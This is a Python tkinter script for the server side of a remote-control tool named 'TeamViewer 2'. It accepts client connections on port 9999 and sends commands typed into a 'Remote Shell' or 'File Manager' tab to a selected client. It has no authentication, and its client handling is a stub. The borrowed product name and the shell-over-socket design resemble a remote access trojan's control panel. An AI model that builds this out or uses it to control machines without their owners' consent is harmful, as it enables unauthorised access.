import tkinter as tk
from tkinter import ttk, messagebox
import socket
import threading
import os

# Global variables
clients = []
client_info = {}

# Server class
class Server(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("TeamViewer 2 - Server")
        self.geometry("800x600")

        self.create_widgets()
        
        # Start server
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind(('0.0.0.0', 9999))
        self.server_socket.listen(5)
        threading.Thread(target=self.accept_clients).start()

    def create_widgets(self):
        self.tab_control = ttk.Notebook(self)
        
        # Client List tab
        self.client_list_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.client_list_tab, text='Client List')
        self.client_listbox = tk.Listbox(self.client_list_tab)
        self.client_listbox.pack(fill=tk.BOTH, expand=1)
        self.client_listbox.bind('<<ListboxSelect>>', self.on_client_select)

        # File Manager tab
        self.file_manager_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.file_manager_tab, text='File Manager')
        self.file_manager_text = tk.Text(self.file_manager_tab)
        self.file_manager_text.pack(fill=tk.BOTH, expand=1)
        self.file_manager_entry = tk.Entry(self.file_manager_tab)
        self.file_manager_entry.pack(fill=tk.X)
        self.file_manager_button = tk.Button(self.file_manager_tab, text='Execute', command=self.execute_file_manager)
        self.file_manager_button.pack()

        # Remote Shell tab
        self.remote_shell_tab = ttk.Frame(self.tab_control)
        self.tab_control.add(self.remote_shell_tab, text='Remote Shell')
        self.remote_shell_text = tk.Text(self.remote_shell_tab)
        self.remote_shell_text.pack(fill=tk.BOTH, expand=1)
        self.remote_shell_entry = tk.Entry(self.remote_shell_tab)
        self.remote_shell_entry.pack(fill=tk.X)
        self.remote_shell_button = tk.Button(self.remote_shell_tab, text='Execute', command=self.execute_remote_shell)
        self.remote_shell_button.pack()

        self.tab_control.pack(expand=1, fill='both')

    def accept_clients(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            clients.append(client_socket)
            client_info[client_socket] = addr
            self.update_client_list()
            threading.Thread(target=self.handle_client, args=(client_socket,)).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024)
                if not data:
                    break
                # Handle client data
            except:
                break
        clients.remove(client_socket)
        del client_info[client_socket]
        self.update_client_list()

    def update_client_list(self):
        self.client_listbox.delete(0, tk.END)
        for client_socket in clients:
            self.client_listbox.insert(tk.END, client_info[client_socket])

    def on_client_select(self, event):
        selected_client = self.client_listbox.curselection()
        if selected_client:
            client_socket = clients[selected_client[0]]
            # Handle client selection
            pass

    def execute_file_manager(self):
        selected_client = self.client_listbox.curselection()
        if selected_client:
            client_socket = clients[selected_client[0]]
            command = self.file_manager_entry.get()
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            self.file_manager_text.insert(tk.END, response + '\n')

    def execute_remote_shell(self):
        selected_client = self.client_listbox.curselection()
        if selected_client:
            client_socket = clients[selected_client[0]]
            command = self.remote_shell_entry.get()
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            self.remote_shell_text.insert(tk.END, response + '\n')

if __name__ == "__main__":
    app = Server()
    app.mainloop()
